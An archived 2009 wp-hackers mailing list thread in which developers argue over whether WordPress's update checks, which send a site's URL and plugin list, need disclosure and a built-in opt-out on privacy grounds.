was also thinking "Foundation[al]" or "Bedrock" might be decent
additions to the list.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From zamoose at gmail.com  Wed Dec  9 16:46:22 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 11:46:22 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
Message-ID: <71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>

On 12/9/09, Otto <otto at ottodestruct.com> wrote:
> So, what is it, precisely, that you object to with the existing data
> collection. What piece of information is being sent that you consider
> to be private and would not want to send? No theoretical arguments,
> please. You know the data being sent, it's been posted here.
> Specifically which piece concerns you, exactly? Why?
>

Otto:
I think the big thing folks are objecting to is lack of disclosure in
the WP UI, documentation, installation process, etc.  Each WordPress
install, unless properly configured, sends back information to the
mothership, but I'd be surprised if >5% of WP users out there even
knew that was the case.

I guess the real question is: if there is a non-trivial amount of
goodwill/positive PR to be gained for the WordPress project and/or
Automattic by simply adding 1) intra-WordPress disclosure of these
submissions and 2) a simple way to opt-out, then why not add said
disclosure and opt-out mechanism.

Last I checked, WordPress' source shipped with citations for the GPLv2
but no disclosure as to information submitted.  At minimum, such a
document should exist.

You can couch the disclosure information in any way you see fit and
remind/inform folks that, by allowing this information to wend its way
to the .org's site, the community as a whole gains a greater insight
into the ways WP is being used and deployed, thus allowing for future
iterations of WP to better fit their needs and desires. *But at a
minimum there needs to be a trivial mechanism for opting out.*

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From photofantaisie at gmail.com  Wed Dec  9 17:02:37 2009
From: photofantaisie at gmail.com (Ade Walker)
Date: Wed, 9 Dec 2009 18:02:37 +0100
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
Message-ID: <9dd057850912090902i5a403a7fn77ee7a1e416f966@mail.gmail.com>

Well said. Agree 100% with you.

2009/12/9 Doug Stewart <zamoose at gmail.com>

> On 12/9/09, Otto <otto at ottodestruct.com> wrote:
> > So, what is it, precisely, that you object to with the existing data
> > collection. What piece of information is being sent that you consider
> > to be private and would not want to send? No theoretical arguments,
> > please. You know the data being sent, it's been posted here.
> > Specifically which piece concerns you, exactly? Why?
> >
>
> Otto:
> I think the big thing folks are objecting to is lack of disclosure in
> the WP UI, documentation, installation process, etc.  Each WordPress
> install, unless properly configured, sends back information to the
> mothership, but I'd be surprised if >5% of WP users out there even
> knew that was the case.
>
> I guess the real question is: if there is a non-trivial amount of
> goodwill/positive PR to be gained for the WordPress project and/or
> Automattic by simply adding 1) intra-WordPress disclosure of these
> submissions and 2) a simple way to opt-out, then why not add said
> disclosure and opt-out mechanism.
>
> Last I checked, WordPress' source shipped with citations for the GPLv2
> but no disclosure as to information submitted.  At minimum, such a
> document should exist.
>
> You can couch the disclosure information in any way you see fit and
> remind/inform folks that, by allowing this information to wend its way
> to the .org's site, the community as a whole gains a greater insight
> into the ways WP is being used and deployed, thus allowing for future
> iterations of WP to better fit their needs and desires. *But at a
> minimum there needs to be a trivial mechanism for opting out.*
>
> --
> -Doug
> @zamoose
> http://literalbarrage.org/blog/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From if.website at gmail.com  Wed Dec  9 17:06:04 2009
From: if.website at gmail.com (Austin Matzko)
Date: Wed, 9 Dec 2009 11:06:04 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
Message-ID: <674b4a3b0912090906t14bcbe44i8ebfb65a8f28a68@mail.gmail.com>

On Wed, Dec 9, 2009 at 10:15 AM, Otto <otto at ottodestruct.com> wrote:
> Because, by default, WordPress sends your URL to Pingomatic every
> single time you post. That's sort of the whole point of XML-RPC pings.
> And, Pingomatic is owned by Automattic, in case you were unaware.

I don't see how this is relevant.  The last time I checked pingbacks
weren't sending out anything that wasn't obviously already public and
certainly not a list of the blog's plugins.

>> There's no reason to conflate the updates with the data collection.
>
> Sure there is, because the only "data collection" in the sense you
> mean it is the PHP and MySQL version numbers. That's the *only* thing
> sent that is used for statistical information.

You seem to be saying that the URL-to-plugins list information is not
being kept.  How do you know this?  When we last had this discussion
over two years ago, Matt said several times that the data being sent
in could potentially be used in the future for statistical purposes,
and I haven't since heard of any exceptions.  Besides, the fact that
the data is sent out is what's important from the standpoint of
privacy, whether or not that data is being used right at the moment.

>> It's possible to check for updates without collecting any data and
>> without revealing anything particular about the original requester
>> other than last proxy IP address.
>
> So, what is it, precisely, that you object to with the existing data
> collection. What piece of information is being sent that you consider
> to be private and would not want to send? No theoretical arguments,
> please. You know the data being sent, it's been posted here.
> Specifically which piece concerns you, exactly? Why?

I'm not "concerned"; I object in principle to phoning home the URL
with associated plugins.  It's the combination of data: associating
the URL to the plugins and the plugins with each other and with the
URL that together form an unnecessary intrusion into the privacy of
the users of WordPress.

The "why?" question is misplaced.  With respect to privacy, the burden
of proof should be on those collecting the information to prove that
their reasons for collecting it are justified.  All the good, stated
goals---keeping updated, knowing how many are using what version of
MySQL and PHP---could be done without the privacy intrusions I've
mentioned.

From otto at ottodestruct.com  Wed Dec  9 17:21:18 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 11:21:18 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <674b4a3b0912090906t14bcbe44i8ebfb65a8f28a68@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<674b4a3b0912090906t14bcbe44i8ebfb65a8f28a68@mail.gmail.com>
Message-ID: <161617690912090921o24af4bbbvdc76d8e021dec0a1@mail.gmail.com>

On Wed, Dec 9, 2009 at 11:06 AM, Austin Matzko <if.website at gmail.com> wrote:
> I don't see how this is relevant. ?The last time I checked pingbacks
> weren't sending out anything that wasn't obviously already public and
> certainly not a list of the blog's plugins.

Not understanding your objection here. If you don't want to send a
list of the plugins, then *disable plugin update checks*. I mean, you
can't have it both ways. To do update checks, you *must* send a list
of the plugins. This seems rather obvious, yeah?

> You seem to be saying that the URL-to-plugins list information is not
> being kept.

I don't see how that is relevant even if they are being kept. Yes, I
suspect that this data is not kept, since the plugin download counter
is so easily gamed at the moment, but there's nothing to gain from
knowing what plugins any given site runs. On 90% of sites out there, I
can tell you what plugins they run merely from looking at the site,
and I can usually get a complete list of them 80% of the time, unless
they've taken pains to hide them.

> I'm not "concerned"; I object in principle to phoning home the URL
> with associated plugins. ?It's the combination of data: associating
> the URL to the plugins and the plugins with each other and with the
> URL that together form an unnecessary intrusion into the privacy of
> the users of WordPress.
>
> The "why?" question is misplaced.

I disagree. The "why?" question is entirely relevant given the above statement.

What exactly can I do with a list of plugins on your site? Hack into
it through some plugin's security hole? This seems naive, site hackers
don't work that way. It's simpler and faster for me to just download
an automated hacking tool, grab all the WP related exploits I can
find, and run them all on your site. One of them will get me in, if
it's possible to do so.

> With respect to privacy, the burden
> of proof should be on those collecting the information to prove that
> their reasons for collecting it are justified. ?All the good, stated
> goals---keeping updated, knowing how many are using what version of
> MySQL and PHP---could be done without the privacy intrusions I've
> mentioned.

I guess I simply don't see any of that data as a "privacy intrusion",
as I don't consider any of it to be private data in any respect.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Wed Dec  9 17:26:34 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 11:26:34 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
Message-ID: <161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com>

On Wed, Dec 9, 2009 at 10:46 AM, Doug Stewart <zamoose at gmail.com> wrote:
> Last I checked, WordPress' source shipped with citations for the GPLv2
> but no disclosure as to information submitted.  At minimum, such a
> document should exist.

The codex is a wiki. Feel free to create a document disclosing all
that info if you like. Make sure to tell everybody about it too, as
well written documents tend to get used all sorts of places.

> *But at a
> minimum there needs to be a trivial mechanism for opting out.*

There is an opt-out. There are disable plugins for update checks, and
many people know about and use them. That's sort of the main complaint
here, although I confess I don't understand how anybody thinks that you
can check for plugin updates without sending information about the plugins...

Also, there's a Settings->Privacy option, which could be extended to
also disable all update checking, for the paranoid. Make a trac ticket
about it, see if it gets any traction.

-Otto
Sent from Memphis, TN, United States

From zamoose at gmail.com  Wed Dec  9 17:50:04 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 12:50:04 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com>
Message-ID: <71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>

On 12/9/09, Otto <otto at ottodestruct.com> wrote:
> The codex is a wiki. Feel free to create a document disclosing all
> that info if you like. Make sure to tell everybody about it too, as
> well written documents tend to get used all sorts of places.

-1 Orthogonal.

I made it very clear: the opt-out/disclosure needs to be
INTRA-WordPress. Last I checked, a copy of the Codex wasn't included
in every download of WP's source.

> There is an opt-out.

There is no opt-out. There's an extension to WordPress' functionality
provided by a third party, but there is NO opt-out provided by the
core.

> There are disable plugins for update checks, and
> many people know about and use them. That's sort of the main complaint
> here, although I confess I don't understand how anybody thinks that you
> can check for plugin updates without sending information about the
> plugins...
>

You're conflating several disparate issues. I (and others) aren't
talking about this as a programming or technical concern, we're
talking about this as a social engineering/community management/Don't
Be Evil concern.  I heartily agree with your technical take on the
issue and would never handicap my installs of WordPress to the degree
such actions dictate.  That, however, is beside the point.  There are
those that for legal, procedural or even just plain paranoid reasons
find the submission of information without their knowledge or consent
to be abhorrent. (See: Beacon, The Facebook)

> Also, there's a Settings->Privacy option, which could be extended to
> also disable all update checking, for the paranoid. Make a trac ticket
> about it, see if it gets any traction.

I'll search Trac -- pretty sure such a ticket already exists, if my
memory serves.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From usleepless at gmail.com  Wed Dec  9 17:56:59 2009
From: usleepless at gmail.com (usleepless at gmail.com)
Date: Wed, 9 Dec 2009 18:56:59 +0100
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com>
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com>
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
Message-ID: <c39ec84c0912090956g7736cd36sf95c40860014cab@mail.gmail.com>

On Wed, Dec 9, 2009 at 4:34 PM, Otto <otto at ottodestruct.com> wrote:

> On Wed, Dec 9, 2009 at 9:30 AM, Austin Matzko <if.website at gmail.com>
> wrote:
> > You omitted (in my mind) the big one:
> >
> > * All plugins, active and inactive, in your plugins directory
>
> The thing is expressly designed to check for plugin updates. You can't
> check for updates to a plugin without actually telling the update
> server what the plugins actually are.
>

nonsense. just provide a file which contains a list of all plugins+latest
version #.

this is no rocket science, it has been done before: freebsd ports / linux
repository/package managers ( apt )

there must be hidden motives / politics here.... or just plain ignorance.

regards,

usleep



>
> If this is a privacy issue for you, then there's means already
> available to disable the update checks entirely.
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From if.website at gmail.com  Wed Dec  9 18:01:27 2009
From: if.website at gmail.com (Austin Matzko)
Date: Wed, 9 Dec 2009 12:01:27 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912090921o24af4bbbvdc76d8e021dec0a1@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<674b4a3b0912090906t14bcbe44i8ebfb65a8f28a68@mail.gmail.com>
	<161617690912090921o24af4bbbvdc76d8e021dec0a1@mail.gmail.com>
Message-ID: <674b4a3b0912091001m65d76581ka79b55b9ea24684a@mail.gmail.com>

On Wed, Dec 9, 2009 at 11:21 AM, Otto <otto at ottodestruct.com> wrote:
> If you don't want to send a
> list of the plugins, then *disable plugin update checks*. I mean, you
> can't have it both ways. To do update checks, you *must* send a list
> of the plugins. This seems rather obvious, yeah?

No, that is not the case.  As I already explained there is a big
difference between

- Sending a site's URL and all associated plugins at a URL
- Requesting from an IP address with perhaps a hashed URL the status
of a particular plugin.

With the former, you are revealing all the plugins at a particular
URL.  With the latter, you reveal only that a client at a particular
IP address has requested information on the status of a particular
plugin.  *Both* accomplish update checks, but only *one* is intrusive.
 *The update checks could be done without privacy intrusions.*  *We
could collect aggregate data on MySQL and PHP versions without privacy
intrusions.* I apologize for not being able to make it any clearer.

This discussion is moot; Matt decided the issue over two years ago, so
I'm not going to continue offending the sensitivities of iPhone
wp-hackers subscribers.  However, I'd be happy to continue to discuss
this off-list with anybody.

From otto at ottodestruct.com  Wed Dec  9 18:10:44 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 12:10:44 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <c39ec84c0912090956g7736cd36sf95c40860014cab@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<2979bd660912062149v583780a2vcec94ec1b7c967c1@mail.gmail.com> 
	<427667db0912062233l20b578b4u565a307c15c2d595@mail.gmail.com> 
	<4B1DF4C5.8050306@mullenweg.com>
	<FB9E9056-06DC-4A68-95F1-F199481EF8A3@willnorris.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<c39ec84c0912090956g7736cd36sf95c40860014cab@mail.gmail.com>
Message-ID: <161617690912091010i35657958ue9528ec98c1a66bc@mail.gmail.com>

On Wed, Dec 9, 2009 at 11:56 AM,  <usleepless at gmail.com> wrote:
>> The thing is expressly designed to check for plugin updates. You can't
>> check for updates to a plugin without actually telling the update
>> server what the plugins actually are.
>>
> nonsense. just provide a file which contains a list of all plugins+latest
> version #.

The plugin repo currently contains 11056 plugins:
http://plugins.svn.wordpress.org/

Seems a tad inefficient to download that list every 12 hours or so.

> this is no rocket science, it has been done before: freebsd ports / linux
> repository/package managers ( apt )

apt and the like are extremely inefficient in this same way, in point of fact.

> there must be hidden motives / politics here.... or just plain ignorance.

Why so personal?

-Otto
Sent from Memphis, TN, United States

From zamoose at gmail.com  Wed Dec  9 18:19:22 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 13:19:22 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com>
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com>
	<71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>
Message-ID: <71ddd7490912091019p7be28f91x1ba9d15b65876e98@mail.gmail.com>

On 12/9/09, Doug Stewart <zamoose at gmail.com> wrote:
>> Also, there's a Settings->Privacy option, which could be extended to
>> also disable all update checking, for the paranoid. Make a trac ticket
>> about it, see if it gets any traction.
>
> I'll search Trac -- pretty sure such a ticket already exists, if my
> memory serves.
>

Oh, hey look: my memory is even worse than I thought! A ticket exists,
it was submitted by me(!) and closed by Matt two years ago:

http://core.trac.wordpress.org/ticket/5066

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From otto at ottodestruct.com  Wed Dec  9 18:21:33 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 12:21:33 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<81d01c0912081720t93c59d5pc6966f071e248be2@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com> 
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com> 
	<71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>
Message-ID: <161617690912091021r7f91dfc9x13ffac5912d5baf1@mail.gmail.com>

On Wed, Dec 9, 2009 at 11:50 AM, Doug Stewart <zamoose at gmail.com> wrote:
> I made it very clear: the opt-out/disclosure needs to be
> INTRA-WordPress. Last I checked, a copy of the Codex wasn't included
> in every download of WP's source.

I'm pretty sure I said "well written documents tend to get used all
sorts of places".

It obviously cannot be in the main line of WordPress until somebody
actually sits down and writes it. And you're more likely to get it
included if you go to trac and say "here's some text I think we should
include" instead of "I think somebody write this down and put it in".
Core commiters have to have something to commit.

> There is no opt-out. There's an extension to WordPress' functionality
> provided by a third party, but there is NO opt-out provided by the
> core.

An opt-out via plugin is still an opt-out. The inherent functionality
doesn't change by adding a checkbox to the core code.

> There are
> those that for legal, procedural or even just plain paranoid reasons
> find the submission of information without their knowledge or consent
> to be abhorrent. (See: Beacon, The Facebook)

Can you please give some of those reasons? (Ignore the paranoid ones,
I don't think WP should cater to paranoia.)

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Wed Dec  9 18:39:05 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 12:39:05 -0600
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <71ddd7490912091019p7be28f91x1ba9d15b65876e98@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com> 
	<4886425E-253D-4ED0-A708-C295EA3C53D4@ftwr.co.uk>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com> 
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com> 
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com> 
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com> 
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com> 
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com> 
	<71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com> 
	<71ddd7490912091019p7be28f91x1ba9d15b65876e98@mail.gmail.com>
Message-ID: <161617690912091039g15975843y422c706524d65bbf@mail.gmail.com>

On Wed, Dec 9, 2009 at 12:19 PM, Doug Stewart <zamoose at gmail.com> wrote:
> Oh, hey look: my memory is even worse than I thought! A ticket exists,
> it was submitted by me(!) and closed by Matt two years ago:
>
> http://core.trac.wordpress.org/ticket/5066

Notice what he said though: "let's just close it until there are
compelling new arguments".

That's basically what I'm looking for here. What is a legitimate,
real-world, argument to provide such an option?

To put it another way: Would you use such a privacy option? Why would
you use it? What rationale can you provide that isn't mere paranoia,
but is actually a reasonable and logical reason for not giving
somebody the info described previously?

-Otto

From otto at ottodestruct.com  Wed Dec  9 18:43:21 2009
From: otto at ottodestruct.com (Otto)
Date: Wed, 9 Dec 2009 12:43:21 -0600
Subject: [wp-hackers] Storing Arbitrary Data as Custom Post Types
In-Reply-To: <4B1FCDFE.2070802@gunters.org>
References: <81d01c0912081522o6c2df5y71f5b4d81f72bbb6@mail.gmail.com> 
	<BEA30E17-9B87-40E8-9B86-1B8E38A1991E@newclarity.net>
	<4B1FCDFE.2070802@gunters.org>
Message-ID: <161617690912091043q5b2d3cc6u55e10718cb040467@mail.gmail.com>

On Wed, Dec 9, 2009 at 10:19 AM, Dougal Campbell <dougal at gunters.org> wrote:
> In a nutshell, my proposal was going to be that we use a naming convention
> like: [area]:[slug]:[name]
>
> For example, if you had a plugin named "Tweet Fu" (which has the slug
> 'tweet-fu' in the respository), you might have an option named:
> plugin:tweet-fu:last_tweet_timestamp
>
> Or if you have a theme that saves its own option:
> theme:my-theme-name:header_image_filename

Generally speaking, most plugins should be using a single option
holding an array of their settings. I tend to go with
pluginname-options, personally.

Any "standard" should take this into account, as keeping every option
in a separate row can be bad practice.

-Otto
Sent from Memphis, TN, United States

From zamoose at gmail.com  Wed Dec  9 19:31:23 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Wed, 9 Dec 2009 14:31:23 -0500
Subject: [wp-hackers] Revisiting phone home and privacy
In-Reply-To: <161617690912091039g15975843y422c706524d65bbf@mail.gmail.com>
References: <427667db0912062108t493589c9k5e999b9904f6ecb8@mail.gmail.com>
	<674b4a3b0912090730m3ff7e39cnc7f2bf02b7b6bfd5@mail.gmail.com>
	<161617690912090734m35a8584u76d28f24bc08534b@mail.gmail.com>
	<674b4a3b0912090752k4e493d62pdf405bbe88347146@mail.gmail.com>
	<161617690912090815o58904676me3726b81e361728f@mail.gmail.com>
	<71ddd7490912090846q62a1201dtba426c7bd92a9a06@mail.gmail.com>
	<161617690912090926l3aa2f526q2d2aab5bb6af0113@mail.gmail.com>
	<71ddd7490912090950w31a21963p61bb27234034bae8@mail.gmail.com>
	<71ddd7490912091019p7be28f91x1ba9d15b65876e98@mail.gmail.com>
	<161617690912091039g15975843y422c706524d65bbf@mail.gmail.com>
Message-ID: <71ddd7490912091131q85866f1s6b526b03acecd8e3@mail.gmail.com>

On 12/9/09, Otto <otto at ottodestruct.com> wrote:
> Notice what he said though: "let's just close it until there are
> compelling new arguments".
>
> That's basically what I'm looking for here. What is a legitimate,
> real-world, argument to provide such an option?
>

We're not providing disclosure of 1) the fact that WordPress is
submitting the data 2) what Automattic does/intends to do with said
data and 3) not allowing a chance to opt-out before the data is sent
the very first time -- i.e., you have to install a plugin and activate
it, thus firing the update check *at least once* in order to complete
the opt-out.

> To put it another way: Would you use such a privacy option?

I personally wouldn't. My chief clients would.

> Why would you use it?

To prevent a fairly detailed application profile of my install from
being sent to and potentially stored by a third party in a way that is
directly traceable to me/my installation.

> What rationale can you provide that isn't mere paranoia,
> but is actually a reasonable and logical reason for not giving
> somebody the info described previously?
>

Is it "paranoia" to worry about my credit card company's databases
being compromised and thus revealing far more information about me
than I want public? Is it "paranoia" to be concerned about the same
thing when it comes to my health care insurance provider? Is it
paranoid for me to worry about Facebook sharing my contact
information, likes, dislikes, etc. with third party advertisers?

You seem to be making the argument that "Well, if you install
WordPress, you're defacto signing away any notions of privacy, at
least inasmuch as Automattic is concerned".

The plain point of the matter is that the base/core WordPress project
is not even disclosing this submission of data, which could
potentially be illegal in certain jurisdictions. A single blog post
made > 2 years ago concerning a version of the software that is 6+
versions out of date with the current is NOT sufficient disclosure.
How many WP installs have been deployed since Sept. 2007? How many
people have been added to the WP community in that time? (Snarky
aside: The very functionality under discussion could actually allow us
to answer those questions with some degree of certainty...) Are they
going to know enough to go back and peruse those blog posts?

The point that I have yet to see YOU make is a compelling case for WHY
a blog's URL needs to be sent to Automattic at all. Why not an MD5
hash of the URL, as was suggested in this thread, the '07 thread and
the Trac ticket? This guarantees uniqueness with at least a gloss of
anonymity, potentially satisfying both ends of the transaction's
concerns.

Opt-out options, full disclosure, etc. are part of the social
engineering/social compact/good citizen argument, which is a separate
matter from the technical concerns.

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From dougal at gunters.org  Wed Dec  9 20:02:41 2009
From: dougal at gunters.org (Dougal Campbell)
Date: Wed, 09 Dec 2009 15:02:41 -0500
